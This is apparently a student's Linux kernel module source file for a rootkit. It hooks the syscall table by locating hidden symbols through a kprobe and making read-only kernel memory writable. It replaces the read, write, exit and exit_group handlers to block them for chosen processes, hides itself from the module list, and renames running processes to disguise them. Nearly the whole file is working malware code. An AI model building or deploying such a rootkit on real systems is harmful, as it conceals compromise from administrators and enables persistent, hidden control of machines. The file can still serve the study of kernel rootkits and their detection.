#include "rootkit.h"

#include <asm/syscall.h>
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>
/// Modify
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
///


#define OURMODNAME "rootkit"

// Setup kprobe
int noop_pre(struct kprobe *p, struct pt_regs *regs) {return 0;}
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};
//unsigned long (*kallsyms_lookup_name_func)(const char *name) = NULL;
typedef unsigned long (*kallsymsFn)(const char *);
kallsymsFn kallsyms_lookup_name_func;
static unsigned long *__sys_call_table;


// store original syscall handler with type sys_call_t
typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);


MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int rootkit_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

// stored list for hiding
static struct list_head *stored_list = NULL;

// Store the original syscall
//asmlinkage long (*original_read)(unsigned int fd, char __user *buf, size_t count);
//asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
//asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
static sys_call_t original_read;
static sys_call_t original_write;
static sys_call_t original_exit;
static sys_call_t original_exit_group;

// My custom read, write and exit (exit group)
static asmlinkage long my_read(const struct pt_regs *regs);
static asmlinkage long my_write(const struct pt_regs *regs);
static asmlinkage long my_exit(const struct pt_regs *regs);
static asmlinkage long my_exit_group(const struct pt_regs *regs);

// filtered read process
struct dynamic_array{
    char **comm;
    int len;
    int size;
};
#define NUM_MAX_FILTERED_PROCESS 10000

struct dynamic_array read_filtered_processes;
struct dynamic_array write_filtered_processes;
struct dynamic_array exit_filtered_processes;
struct dynamic_array exit_group_filtered_processes;


// For opening read only memory to writable
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;


static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                          unsigned long arg) {
    long ret = 0;
    struct filter_info passing_infos;
    printk(KERN_INFO "%s\n", __func__);

    switch (ioctl) {
    case IOCTL_MOD_HIDE:

        /*
         *  using stored_list static variable to store the hidden list
         *  If NULL, non-hidden, store and hide the list
         *  Else, restore back.
         */

        if (stored_list == NULL)
        {
            stored_list = THIS_MODULE->list.prev;
            list_del(&THIS_MODULE->list);
        }
        else 
        {
            list_add(&THIS_MODULE->list, stored_list);
            stored_list = NULL;  
        }
        break;
    case IOCTL_MOD_MASQ:
        /*
         * Reference:
         * 1. kmalloc: https://blog.csdn.net/lu_embedded/article/details/51588902
         * 2. copy_from_user: https://blog.csdn.net/bhniunan/article/details/104088763
         * 3. for_each_proces and task structure:
         *     - linux/include/linux/sched.h
         *     - linux/include/linux/sched/signal.h
         */

        // ISO 90: Need to first declare the variables _^_ (So bad -__-)
        struct masq_proc_req current_infos;
        struct masq_proc *proc_list;
        struct task_struct *task;

        /*
         * Note:
         * - copy_from_user: the same functionality of memcpy but dealing with different page tables
         *                   between user space and kernel space
         */

        // copy the user forward arguments, which is the current masq infos
        copy_from_user(&current_infos, (struct masq_proc_req *)arg, sizeof(current_infos));

        // Further copy the list masq_proc_list
        proc_list = kmalloc(sizeof(struct masq_proc) * current_infos.len, GFP_KERNEL); 
        copy_from_user(proc_list, current_infos.list, current_infos.len * sizeof(struct masq_proc));

        // Iterate over every masq name from users
        for(int i=0;i<current_infos.len;i++)
        {
            // Find if there exists possible task ^-^
            for_each_process(task)
            {
                if(strcmp(task->comm, proc_list[i].orig_name)==0) // If this task name == candidate i
                {
                    // If the new name is shorter than the old name -> masquerade
                    if(strlen(proc_list[i].new_name) < strlen(task->comm))
                    {
                        strncpy(task->comm, proc_list[i].new_name, TASK_COMM_LEN-1);
                        task->comm[TASK_COMM_LEN - 1] = '\0';
                    }
                }
            }
        }

        kfree(proc_list);
        break;
    case IOCTL_ADD_FILTER:
        // Copy the filter info into kernel space memory
        //
        /*
         * Reference:
         * 1. https://blog.csdn.net/weixin_45030965/article/details/129203081
         * 2. https://blog.csdn.net/u013250169/article/details/114374228
         */
        copy_from_user(&passing_infos, (struct filter_info *)arg, sizeof(passing_infos));

        // Check if syscall_nr = read or write or exit (exit group)
        if(passing_infos.syscall_nr != __NR_read && passing_infos.syscall_nr != __NR_write 
                && passing_infos.syscall_nr != __NR_exit && passing_infos.syscall_nr != __NR_exit_group)
        {
            printk("The passing syscall_nr does not support custom filtering.");
            break;
        }

        // Check if the process name has already been filtered
        if(passing_infos.syscall_nr == __NR_read)
        {
            for(int i=0;i<read_filtered_processes.len;i++)
            {
                if(strcmp(passing_infos.comm, read_filtered_processes.comm[i])==0)
                {
                    printk("This process has already been filtered.");
                    break;
                }
            }
        }
        if(passing_infos.syscall_nr == __NR_write)
        {
            for(int i=0;i<write_filtered_processes.len;i++)
            {
                if(strcmp(passing_infos.comm, write_filtered_processes.comm[i])==0)
                {
                    printk("This process has already been filtered.");
                    break;
                }
            }
        }
        if(passing_infos.syscall_nr == __NR_exit)
        {
            for(int i=0;i<exit_filtered_processes.len;i++)
            {
                if(strcmp(passing_infos.comm, exit_filtered_processes.comm[i])==0)
                {
                    printk("This process has already been filtered.");
                    break;
                }
            }
        }
        if(passing_infos.syscall_nr == __NR_exit_group)
        {
            for(int i=0;i<exit_group_filtered_processes.len;i++)
            {
                if(strcmp(passing_infos.comm, exit_group_filtered_processes.comm[i])==0)
                {
                    printk("This process has already been filtered.");
                    break;
                }
            }
        }

        // Check if the filter list is full (Probably non-happen)
        if(passing_infos.syscall_nr == __NR_read && read_filtered_processes.len + 1 >= NUM_MAX_FILTERED_PROCESS)
        {
            printk("Filtered list for read is full. Cannot add anything.");
            break;
        }
        if(passing_infos.syscall_nr == __NR_write && write_filtered_processes.len + 1 >= NUM_MAX_FILTERED_PROCESS)
        {
            printk("Filtered list for write is full. Cannot add anything.");
            break;
        }
        if(passing_infos.syscall_nr == __NR_exit && exit_filtered_processes.len + 1 >= NUM_MAX_FILTERED_PROCESS)
        {
            printk("Filtered list for exit is full. Cannot add anything.");
            break;
        }
        if(passing_infos.syscall_nr == __NR_exit_group && exit_group_filtered_processes.len + 1 >= NUM_MAX_FILTERED_PROCESS)
        {
            printk("Filtered list for exit group is full. Cannot add anything.");
            break;
        }
        
        // Memorizing the processes
        if(passing_infos.syscall_nr == __NR_read)
        {
            if(read_filtered_processes.len+1 > read_filtered_processes.size)
            {
                read_filtered_processes.comm[read_filtered_processes.len] = 
                    (char *)kmalloc(sizeof(char) * TASK_FILTER_LEN, GFP_KERNEL);
                read_filtered_processes.size++;
            }
            strcpy(read_filtered_processes.comm[read_filtered_processes.len], passing_infos.comm);
            read_filtered_processes.len++;
        }
        if(passing_infos.syscall_nr == __NR_write)
        {
            if(write_filtered_processes.len+1 > write_filtered_processes.size)
            {
                write_filtered_processes.comm[write_filtered_processes.len] = 
                    (char *)kmalloc(sizeof(char) * TASK_FILTER_LEN, GFP_KERNEL);
                write_filtered_processes.size++;
            }
            strcpy(write_filtered_processes.comm[write_filtered_processes.len], passing_infos.comm);
            write_filtered_processes.len++;
        }
        if(passing_infos.syscall_nr == __NR_exit)
        {
            if(exit_filtered_processes.len+1 > exit_filtered_processes.size)
            {
                exit_filtered_processes.comm[exit_filtered_processes.len] = 
                    (char *)kmalloc(sizeof(char) * TASK_FILTER_LEN, GFP_KERNEL);
                exit_filtered_processes.size++;
            }
            strcpy(exit_filtered_processes.comm[exit_filtered_processes.len], passing_infos.comm);
            exit_filtered_processes.len++;
        }
        if(passing_infos.syscall_nr == __NR_exit_group)
        {
            if(exit_group_filtered_processes.len+1 > exit_group_filtered_processes.size)
            {
                exit_group_filtered_processes.comm[exit_group_filtered_processes.len] = 
                    (char *)kmalloc(sizeof(char) * TASK_FILTER_LEN, GFP_KERNEL);
                exit_group_filtered_processes.size++;
            }
            strcpy(exit_group_filtered_processes.comm[exit_group_filtered_processes.len], passing_infos.comm);
            exit_group_filtered_processes.len++;
        }
        break;
    case IOCTL_REMOVE_FILTER:
        int visit = 0;
        // Copy the filter info into kernel space memory
        copy_from_user(&passing_infos, (struct filter_info *)arg, sizeof(passing_infos));

        // Check if syscall_nr = read or write or exit (exit group)
        if(passing_infos.syscall_nr != __NR_read && passing_infos.syscall_nr != __NR_write 
                && passing_infos.syscall_nr != __NR_exit && passing_infos.syscall_nr != __NR_exit_group)
        {
            printk("The passing syscall_nr does not support custom filtering.");
            break;
        }

        // Check if the process name has already been filtered
        if(passing_infos.syscall_nr == __NR_read)
        {
            for(int i=0;i<read_filtered_processes.len;i++)
            {
                if(visit) strcpy(read_filtered_processes.comm[i-1], read_filtered_processes.comm[i]);
                else if(strcmp(passing_infos.comm, read_filtered_processes.comm[i])==0) visit = 1;
            }
            if(visit) read_filtered_processes.len--;
        }
        if(passing_infos.syscall_nr == __NR_write)
        {
            for(int i=0;i<write_filtered_processes.len;i++)
            {
                if(visit) strcpy(write_filtered_processes.comm[i-1], write_filtered_processes.comm[i]);
                else if(strcmp(passing_infos.comm, write_filtered_processes.comm[i])==0) visit = 1;
            }
            if(visit) write_filtered_processes.len--;
        }
        if(passing_infos.syscall_nr == __NR_exit_group)
        {
            for(int i=0;i<exit_group_filtered_processes.len;i++)
            {
                if(visit) strcpy(exit_group_filtered_processes.comm[i-1], exit_group_filtered_processes.comm[i]);
                else if(strcmp(passing_infos.comm, exit_group_filtered_processes.comm[i])==0) visit = 1;
            }
            if(visit) exit_group_filtered_processes.len--;
        }
        break;
    default:
        ret = -EINVAL;
    }

    return ret;
}

static int major;
static struct class *cls;

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

static inline void protect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin-start_rodata, PAGE_KERNEL_RO);
}

static inline void open_memory(void)
{
    pr_info("start_rodata: %lx, init_begin: %lx\n", (unsigned long)start_rodata, (unsigned long)init_begin);
    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, init_begin-start_rodata, PAGE_KERNEL);
}

static int __init rootkit_init(void) {
    major = register_chrdev(0, OURMODNAME, &fops);
    if (major < 0) {
        pr_err("Registering char device failed with %d\n", major);
        return major;
    }

    pr_info("The module was assigned major number %d.\n", major);
    cls = class_create(THIS_MODULE, OURMODNAME);
    device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
    pr_info("Device created on /dev/%s\n", OURMODNAME);

    /// overwrite syscall table

    // Register kallsyms_lookup_name
    kp.pre_handler = noop_pre;
    register_kprobe(&kp);
    kallsyms_lookup_name_func = (kallsymsFn)kp.addr;
    unregister_kprobe(&kp);
    printk(KERN_INFO "Address of kallsyms_lookup_name_func: %p\n", kallsyms_lookup_name_func);


    // Allocate the list for filtering read and write
    read_filtered_processes.comm  = (char **)kmalloc(sizeof(char *)*NUM_MAX_FILTERED_PROCESS, GFP_KERNEL);
    write_filtered_processes.comm = (char **)kmalloc(sizeof(char *)*NUM_MAX_FILTERED_PROCESS, GFP_KERNEL);
    exit_filtered_processes.comm = (char **)kmalloc(sizeof(char *)*NUM_MAX_FILTERED_PROCESS, GFP_KERNEL);
    exit_group_filtered_processes.comm = (char **)kmalloc(sizeof(char *)*NUM_MAX_FILTERED_PROCESS, GFP_KERNEL);

    // Get some hidden variables via kallsyms_lookup_name 
    __sys_call_table = (unsigned long *)kallsyms_lookup_name_func("sys_call_table");
    update_mapping_prot = (void *)kallsyms_lookup_name_func("update_mapping_prot");
    start_rodata = (unsigned long)kallsyms_lookup_name_func("__start_rodata");
    init_begin = (unsigned long)kallsyms_lookup_name_func("__init_begin");


    // Store the original syscall
    original_read = (sys_call_t)__sys_call_table[__NR_read];
    original_write = (sys_call_t)__sys_call_table[__NR_write];
    original_exit = (sys_call_t)__sys_call_table[__NR_exit];
    original_exit_group = (sys_call_t)__sys_call_table[__NR_exit_group];

    // Change to my custom filtered function
    open_memory();
    __sys_call_table[__NR_read] = (unsigned long)my_read;
    __sys_call_table[__NR_write] = (unsigned long)my_write;
    __sys_call_table[__NR_exit] = (unsigned long)my_exit;
    __sys_call_table[__NR_exit_group] = (unsigned long)my_exit_group;
    protect_memory();

    return 0;
}

static void __exit rootkit_exit(void) {

    ////// Restore back the original syscall

    // Change to the original read / write function
    open_memory();
    __sys_call_table[__NR_read]  = (unsigned long)original_read;
    __sys_call_table[__NR_write] = (unsigned long)original_write;
    __sys_call_table[__NR_exit] = (unsigned long)original_exit;
    __sys_call_table[__NR_exit_group] = (unsigned long)original_exit_group;
    protect_memory();
    ///////////////////////////////////////

    pr_info("%s: removed\n", OURMODNAME);
    device_destroy(cls, MKDEV(major, 0));
    class_destroy(cls);
    unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);

static asmlinkage long my_read(const struct pt_regs *regs)
{
    for(int i=0; i<read_filtered_processes.len; i++)
    {
        if(strcmp(read_filtered_processes.comm[i], current->comm) == 0)
        {
            return -ENOSYS;
        }
    }
    return original_read(regs);
}
static asmlinkage long my_write(const struct pt_regs *regs)
{
    for(int i=0; i<write_filtered_processes.len; i++)
    {
        if(strcmp(write_filtered_processes.comm[i], current->comm) == 0)
        {
            return -ENOSYS;
        }
    }
    return original_write(regs);
}
static asmlinkage long my_exit(const struct pt_regs *regs)
{
    for(int i=0; i<exit_filtered_processes.len; i++)
    {
        if(strcmp(exit_filtered_processes.comm[i], current->comm) == 0)
        {
            return -ENOSYS;
        }
    }
    return original_exit(regs);
}
static asmlinkage long my_exit_group(const struct pt_regs *regs)
{
    for(int i=0; i<exit_group_filtered_processes.len; i++)
    {
        if(strcmp(exit_group_filtered_processes.comm[i], current->comm) == 0)
        {
            return -ENOSYS;
        }
    }
    return original_exit_group(regs);
}
